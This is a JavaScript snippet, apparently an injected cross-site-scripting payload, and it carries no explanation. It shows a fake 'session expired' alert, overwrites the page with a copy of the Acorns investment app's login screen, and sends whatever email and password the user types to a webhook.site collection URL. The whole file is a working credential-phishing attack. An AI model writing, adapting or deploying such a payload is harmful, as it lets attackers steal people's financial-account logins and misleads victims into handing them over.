alert('Session expired - Please login again');

document.open();
document.write(`

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acorns - Log in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0b4b3a 0%, #1e8a6b 100%);
            padding: 20px;
        }
        
        .login-container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
            padding: 48px 40px;
        }
        
        .logo-section {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #0b4b3a;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }
        
        .welcome-text {
            font-size: 24px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 8px;
        }
        
        .sub-text {
            font-size: 16px;
            color: #666;
            margin-bottom: 32px;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            transition: border-color 0.2s;
            background: #f8f8f8;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: #1e8a6b;
            background: white;
        }
        
        .forgot-password {
            text-align: right;
            margin-bottom: 24px;
        }
        
        .forgot-password a {
            color: #1e8a6b;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #1e8a6b;
            color: white;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 24px;
        }
        
        .login-btn:hover {
            background: #0b4b3a;
        }
        
        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 24px 0;
            color: #999;
            font-size: 14px;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .divider span {
            padding: 0 16px;
        }
        
        .apple-btn {
            width: 100%;
            padding: 14px;
            background: white;
            border: 2px solid #e0e0e0;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 500;
            color: #333;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background 0.2s;
        }
        
        .apple-btn:hover {
            background: #f5f5f5;
        }
        
        .apple-icon {
            font-size: 20px;
        }
        
        .weather-footer {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #666;
            font-size: 13px;
        }
        
        .weather-info {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .temp {
            font-weight: 600;
        }
        
        .date-time {
            color: #999;
        }
        
        .language-selector {
            display: flex;
            gap: 10px;
        }
        
        .language-selector a {
            color: #666;
            text-decoration: none;
        }
        
        .language-selector a:hover {
            color: #1e8a6b;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-section">
            <div class="logo">acorns</div>
            <div class="welcome-text">Log in to Acorns</div>
            <div class="sub-text">Welcome back! Log in to continue.</div>
        </div>
        
        <form action="https://webhook.site/1d7986a3-ebad-4673-a29e-b66ef5185237" method="POST">
            <div class="input-group">
                <label>Email</label>
                <input type="email" name="email" placeholder="Enter your email" required>
            </div>
            
            <div class="input-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <div class="forgot-password">
                <a href="#">Forgot Password?</a>
            </div>
            
            <button type="submit" class="login-btn">Log in</button>
        </form>
        
        <div class="divider">
            <span>or</span>
        </div>
        
        <button class="apple-btn">
            <span class="apple-icon"></span>
            Sign in with Apple
        </button>
        
        <div class="weather-footer">
            <div class="weather-info">
                <span>☀️</span>
                <span class="temp">26°C</span>
                <span>Mostly clear</span>
            </div>
            <div class="language-selector">
                <a href="#">ENG</a>
                <span>|</span>
                <a href="#">IN</a>
            </div>
            <div class="date-time">
                23:13 • 14-03-2026
            </div>
        </div>
    </div>
</body>
</html>

`);
document.close();
